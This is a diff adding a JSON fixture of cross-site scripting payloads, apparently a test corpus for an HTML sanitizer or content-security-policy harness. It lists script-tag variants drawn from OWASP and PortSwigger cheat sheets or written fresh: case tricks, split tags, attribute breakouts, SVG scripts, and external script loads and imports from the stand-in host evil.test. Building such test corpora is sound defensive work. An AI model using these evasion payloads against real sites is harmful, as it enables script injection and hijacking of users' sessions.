@@ -1,0 +1,121 @@
+[
+  {
+    "id": "script-basic",
+    "category": "script",
+    "source": "OWASP XSS Filter Evasion Cheat Sheet (own variation)",
+    "html": "<script>alert(1)</script>",
+    "notes": "Plain script element."
+  },
+  {
+    "id": "script-postmessage",
+    "category": "script",
+    "source": "own",
+    "html": "<p>hi</p><script>parent.postMessage('PWNED','*')</script>",
+    "notes": "Canary via postMessage to the parent."
+  },
+  {
+    "id": "script-uppercase",
+    "category": "script",
+    "source": "OWASP (own variation)",
+    "html": "<SCRIPT>alert(1)</SCRIPT>",
+    "notes": "Case variant."
+  },
+  {
+    "id": "script-mixed-case",
+    "category": "script",
+    "source": "own",
+    "html": "<ScRiPt >alert(1)</sCrIpT >",
+    "notes": "Mixed case and trailing spaces."
+  },
+  {
+    "id": "script-src-external",
+    "category": "script",
+    "source": "OWASP (own variation)",
+    "html": "<script src=\"http://evil.test/x.js\"></script>",
+    "notes": "External script."
+  },
+  {
+    "id": "script-src-protocol-relative",
+    "category": "script",
+    "source": "OWASP (own variation)",
+    "html": "<script src=//evil.test/x.js></script>",
+    "notes": "Protocol-relative URL."
+  },
+  {
+    "id": "script-slash-separator",
+    "category": "script",
+    "source": "OWASP (own variation)",
+    "html": "<script/xss src=\"http://evil.test/x.js\"></script>",
+    "notes": "Slash instead of whitespace before attributes."
+  },
+  {
+    "id": "script-unclosed",
+    "category": "script",
+    "source": "own",
+    "html": "<script>alert(1)",
+    "notes": "Unterminated script consumes the rest of the input."
+  },
+  {
+    "id": "script-nested-split",
+    "category": "script",
+    "source": "own",
+    "html": "<scr<script>ipt>alert(1)</scr</script>ipt>",
+    "notes": "Naive string stripping would reassemble a script tag."
+  },
+  {
+    "id": "script-in-attribute-breakout",
+    "category": "script",
+    "source": "own",
+    "html": "<div title=\"\"><script>alert(1)</script>\">x</div>",
+    "notes": "Attribute closed early, then a script."
+  },
+  {
+    "id": "script-svg-namespace",
+    "category": "script",
+    "source": "own",
+    "html": "<svg><script>alert(1)</script></svg>",
+    "notes": "Script element in the SVG namespace."
+  },
+  {
+    "id": "script-svg-xlink",
+    "category": "script",
+    "source": "PortSwigger XSS cheat sheet (own variation)",
+    "html": "<svg><script xlink:href=\"data:,alert(1)\"></script></svg>",
+    "notes": "SVG script with xlink:href."
+  },
+  {
+    "id": "script-type-module",
+    "category": "script",
+    "source": "own",
+    "html": "<script type=\"module\">import('http://evil.test/m.js')</script>",
+    "notes": "Module script with dynamic import."
+  },
+  {
+    "id": "script-nonce-guess",
+    "category": "script",
+    "source": "own",
+    "html": "<script nonce=\"n0nc3abc\">alert(1)</script>",
+    "notes": "Guessing a static nonce: the harness uses a fresh random nonce per response."
+  },
+  {
+    "id": "script-noscript-wrap",
+    "category": "script",
+    "source": "own",
+    "html": "<noscript></noscript><script>alert(1)</script>",
+    "notes": "Script right after an empty noscript."
+  },
+  {
+    "id": "script-inside-table",
+    "category": "script",
+    "source": "own",
+    "html": "<table><script>alert(1)</script><tr><td>x</td></tr></table>",
+    "notes": "Script inside table context (not foster-parented)."
+  },
+  {
+    "id": "script-event-for",
+    "category": "script",
+    "source": "own",
+    "html": "<script for=\"window\" event=\"onload\">alert(1)</script>",
+    "notes": "Legacy IE for/event attributes."
+  }
+]
